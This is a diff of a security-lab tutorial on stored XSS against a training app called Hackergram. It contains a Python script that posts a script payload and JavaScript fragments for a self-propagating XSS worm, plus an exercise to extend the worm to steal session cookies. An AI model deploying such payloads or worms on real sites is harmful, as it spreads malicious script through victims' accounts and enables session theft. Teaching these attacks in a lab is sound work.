@@ -10,46 +10,48 @@ In this attack, the attacker writes a post that contains JavaScript code (which 
 
 1.	Create a file with the following Python script at the attacker:
 
-``` py
-import requests
-import sys
+    ??? note "Stored XSS Attack Script"
 
-def reset(session):
-    session.get(SERVER+"/reset")
+        ``` py
+        import requests
+        import sys
 
-def register(session):
-    payload = {
-        'username': "mallory",
-        'name': "Mallory",
-        'password': "eve123"
-    }
-    session.post(SERVER+"/signup", data=payload)
+        def reset(session):
+            session.get(SERVER+"/reset")
 
-def login(session):
-    payload = {
-        'username': "mallory",
-        'password': "eve123"
-    }
-    session.post(SERVER+"/login", data=payload)
+        def register(session):
+            payload = {
+                'username': "mallory",
+                'name': "Mallory",
+                'password': "eve123"
+            }
+            session.post(SERVER+"/signup", data=payload)
 
-def exploit(session):
-    payload = {
-        'content': "<script>alert(\"XSS\")</script>",
-    }
-    r = session.post(SERVER+"/create_post", data=payload)
-    print(r)
+        def login(session):
+            payload = {
+                'username': "mallory",
+                'password': "eve123"
+            }
+            session.post(SERVER+"/login", data=payload)
 
-if __name__ == '__main__':
-    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
-    port = '80' if len(sys.argv) < 3 else sys.argv[2]
-    SERVER = "http://" + host + ":" + port
-    print(SERVER)
-    with requests.session() as s:
-        reset(s)
-        register(s)
-        login(s)
-        exploit(s)
-```
+        def exploit(session):
+            payload = {
+                'content': "<script>alert(\"XSS\")</script>",
+            }
+            r = session.post(SERVER+"/create_post", data=payload)
+            print(r)
+
+        if __name__ == '__main__':
+            host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
+            port = '80' if len(sys.argv) < 3 else sys.argv[2]
+            SERVER = "http://" + host + ":" + port
+            print(SERVER)
+            with requests.session() as s:
+                reset(s)
+                register(s)
+                login(s)
+                exploit(s)
+        ```
 
 The script first makes a request to the ```/reset``` endpoint to force a clean state on Hackergram and then registers and logs in the ```@mallory``` user. Lastly, it makes a request to the ```/create_post``` endpoint, creating a new post with the content: ```<script>alert("XSS")</script>```. This post is going to be stored in Hackergram's database.
 
@@ -81,6 +83,55 @@ Note that ```%28``` and ```%29``` encode the ```(``` and ```)``` characters, and
     2. Using the bleach library, sanitize the ```/users``` endpoint so that the attack is no longer possible.
 
 ## XSS Worm
+
+The presence of a stored XSS vulnerability enables a particularly dangerous form of malware: an XSS worm. A worm exploits the feedback loop inherent in social applications — malicious script is stored as application content, executed when another user loads the affected page, and then uses the application itself to create a new infected artifact, enabling self-propagation through the platform.
+
+In Hackergram, the worm exploits the posts feature. An attacker creates a post containing malicious JavaScript. When another user visits the page, the browser executes the script under the application's origin. The script then automatically creates a new post on behalf of the victim, propagating the attack further.
+
+### How the worm self-propagates
+
+The worm reconstructs a copy of its own code from the page's DOM. The following instruction retrieves the contents of the script element that contains the worm:
+
+```js
+var code = document.getElementById("worm").innerHTML;
+```
+
+The script then rebuilds a complete `<script>` element and encodes it so it can be transmitted inside an HTTP request:
+
+```js
+var header = "<script type=" + "text/javascript" + " id=" + "worm>";
+var tail = "</" + "script>";
+var worm = encodeURIComponent(header + code + tail);
+```
+
+After reconstructing the payload, the worm sends a POST request to the vulnerable `/create_post` endpoint, embedding both a visible message and the encoded copy of the worm:
+
+```js
+var params = "&content=Mallory hacked me" + worm;
+http.open("POST", url, true);
+http.send(params);
+```
+
+When the victim's browser executes this request, a new post is created under their account containing both the message and the malicious script. This post becomes a new infection source: when another user views it, their browser executes the same payload, creating yet another infected post and propagating the worm further.
+
+Before propagating, the worm checks whether the current user is the attacker. It inspects the DOM element that contains the username:
+
+```js
+document.getElementById("user").outerHTML.search("mallory")
+```
+
+This expression returns the index position of `"mallory"` within the HTML of the user element, or `-1` if the string is not found. The worm only proceeds when the result is `-1`, preventing the attacker from reinfecting her own account.
+
+### Exercise
+
+1. Using the attacker machine, create a post that contains the XSS worm payload described above.
+2. Log in as a different user (e.g., `mr_robot`) and visit the posts page.
+3. Confirm that a new post was automatically created under `mr_robot`'s account containing a copy of the worm.
+4. Log in as a third user and verify that the worm has propagated again.
+
+!!! note "Additional exercise"
+
+    Modify the worm so that, in addition to creating a new post, it also sends the victim's session cookie to an attacker-controlled endpoint before propagating.
 
 ## Countermeasures
 
